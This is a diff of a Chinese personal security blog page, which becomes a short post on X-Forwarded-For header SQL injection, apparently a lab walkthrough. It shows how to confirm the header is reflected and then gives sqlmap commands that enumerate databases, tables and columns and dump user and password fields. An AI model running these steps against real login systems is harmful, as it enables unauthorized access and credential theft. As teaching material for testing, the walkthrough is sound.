@@ -4,17 +4,24 @@
   <meta charset="utf-8">
   
   
-  <title>归档: 2025 | 钟民的个人博客</title>
+  <title>钟民的个人博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="分享编程，网络安全技术">
-<meta property="og:type" content="website">
+  <meta name="description" content="xff注入测试思路 1、登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip 2、通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1 3、如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞 4、通过在登录框数据包中添加x-forwarded-for:*，用sqlmap 跑注入,跑数据">
+<meta property="og:type" content="article">
 <meta property="og:title" content="钟民的个人博客">
-<meta property="og:url" content="http://example.com/archives/2025/index.html">
+<meta property="og:url" content="http://example.com/2026/04/28/xff%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="钟民的个人博客">
-<meta property="og:description" content="分享编程，网络安全技术">
+<meta property="og:description" content="xff注入测试思路 1、登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip 2、通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1 3、如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞 4、通过在登录框数据包中添加x-forwarded-for:*，用sqlmap 跑注入,跑数据">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.mozhe.cn/uploads/2020/04/14/15868346938cea55.png">
+<meta property="og:image" content="https://www.mozhe.cn/uploads/2020/04/14/15868346945747a0.png">
+<meta property="og:image" content="https://www.mozhe.cn/uploads/2020/04/14/1586834694d37124.png">
+<meta property="og:image" content="https://www.mozhe.cn/uploads/2020/04/14/158683469669cb3e.png">
+<meta property="article:published_time" content="2026-04-28T15:11:28.175Z">
+<meta property="article:modified_time" content="2026-04-28T15:11:28.517Z">
 <meta property="article:author" content="zmdclj">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.mozhe.cn/uploads/2020/04/14/15868346938cea55.png">
   
     <link rel="alternate" href="/atom.xml" title="钟民的个人博客" type="application/atom+xml">
   
@@ -75,39 +82,70 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2025" class="archive-year">2025</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2025/02/01/linxu/" class="archive-article-date">
-  <time class="dt-published" datetime="2025-02-01T06:15:24.000Z" itemprop="datePublished">2月 1</time>
+        <section id="main"><article id="post-xff注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/28/xff%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2026-04-28T15:11:28.175Z" itemprop="datePublished">2026-04-28</time>
 </a>
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/02/01/linxu/">Linux基础操作</a>
-    </h1>
-  
-
-    </header>
+    
   </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="xff注入"><a href="#xff注入" class="headerlink" title="xff注入"></a>xff注入</h1><p>测试思路</p>
+<p>1、登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip</p>
+<p>2、通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1</p>
+<p>3、如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞</p>
+<p>4、通过在登录框数据包中添加x-forwarded-for:*，用sqlmap 跑注入,跑数据库名，表名，字段名，字段内容</p>
+<p>测试步骤</p>
+<p>1、登陆随意输入密码，返回提示</p>
+<p><img src="https://www.mozhe.cn/uploads/2020/04/14/15868346938cea55.png" alt="img"></p>
+<p> 2、在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1</p>
+<p><img src="https://www.mozhe.cn/uploads/2020/04/14/15868346945747a0.png" alt="img"></p>
+<p> <img src="https://www.mozhe.cn/uploads/2020/04/14/1586834694d37124.png" alt="img"></p>
+<p> 3、存在此漏洞，保存请求包到1.txt里（X-Forwarded-For值改为*）</p>
+<p><img src="https://www.mozhe.cn/uploads/2020/04/14/158683469669cb3e.png" alt="img"></p>
+<p> 4、使用sqlmap开始跑，</p>
+<p>  1）sqlmap爆出库名：sqlmap -r d:&#x2F;aaa.txt –db –batch</p>
+<p>  2）表名:sqlmap -r d:&#x2F;aaa.txt -D webcalender –tables –batch</p>
+<p>  3）字段：sqlmap -r d:&#x2F;aa.txt -D webcalender -T user –columns –batch </p>
+<p>  4）字段内容：sqlmap -r d:&#x2F;aa.txt -D webcalender -T user -C ‘user,password’ –batch</p>
+<p>获取账号与密码</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/28/xff%E6%B3%A8%E5%85%A5/" data-id="cuid-HLeonygo4Y67DAjIhPL9" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2026/04/28/mysql%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/04/27/markdown/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Markdown 语法基础</div>
+    </a>
+  
+</nav>
+
+  
 </article>
-  
-  
-    </div></section>
-  
 
 
 </section>
